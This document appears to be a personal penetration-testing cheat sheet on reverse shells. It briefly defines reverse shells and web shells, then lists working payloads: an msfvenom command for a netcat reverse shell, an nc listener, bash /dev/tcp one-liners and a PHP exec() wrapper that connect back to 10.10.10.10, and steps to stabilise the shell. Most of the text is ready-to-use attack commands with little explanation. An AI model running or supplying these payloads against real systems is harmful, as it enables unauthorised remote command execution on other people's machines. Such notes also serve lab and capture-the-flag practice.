# Reverse Shell
A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.


# msfvenom
Example: generate a reverse shell payload using msfvenom:
`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format



listen with `nc`
`nc -lnvp 4444`


# Bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# PHP - Bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'");
may have to scape the quotes
exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'\");








# estabilize shell?

```sh
python -c 'import pty;pty.spawn("/bin/bash")'
```


```
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
Then press Enter twice, and then enter:
export TERM=xterm
```